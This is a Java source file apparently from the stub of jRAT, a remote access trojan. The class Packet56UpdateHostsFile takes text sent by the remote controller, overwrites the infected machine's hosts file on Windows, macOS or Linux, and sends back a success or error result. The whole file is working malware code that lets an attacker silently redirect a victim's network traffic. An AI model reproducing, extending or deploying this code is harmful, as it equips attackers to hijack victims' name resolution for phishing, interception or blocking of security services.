package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileWriter;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet39HostEditResult;

import com.redpois0n.oslib.OperatingSystem;

public class Packet56UpdateHostsFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String str = Connection.readLine();

		File file = null;

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			file = new File("/private/etc/hosts");
		} else {
			file = new File("/etc/hosts");
		}

		if (file != null) {
			try {
				FileWriter writer = new FileWriter(file);
				writer.write(str);
				writer.close();
				Connection.addToSendQueue(new Packet39HostEditResult(""));
			} catch (Exception ex) {
				Connection.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
			}
		}
	}

}
